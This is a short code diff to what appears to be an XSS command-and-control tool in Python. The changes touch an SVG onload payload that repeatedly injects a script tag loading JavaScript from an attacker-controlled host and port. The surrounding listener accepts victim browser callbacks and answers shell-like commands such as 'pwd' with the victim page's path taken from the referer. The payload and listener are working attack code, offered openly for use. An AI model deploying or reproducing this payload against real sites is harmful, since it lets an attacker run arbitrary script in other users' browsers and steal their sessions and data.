@@ -49,7 +49,7 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s/"},999)>\n' % (blue, host, port)
+payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>\n' % (blue, host, port)
 
 
 print(banner)
@@ -71,7 +71,7 @@ Connection: close
         if secs != 0:
             s.settimeout(secs)
         buffer = input('%s$ %s' % (blue, white))
-        s.listen(2)
+        s.listen(0)
         try:
             c, a = s.accept()
             data = c.recv(1024)
@@ -85,7 +85,7 @@ Connection: close
                     print('Could not get the source domain because the referer has been disabled')
             elif buffer == 'pwd':
                 try:
-                    print('/' + path)
+                    print('/%s' % path)
                 except:
                     print('Could not get the source path because the referer has been disabled')
             elif buffer == 'help':
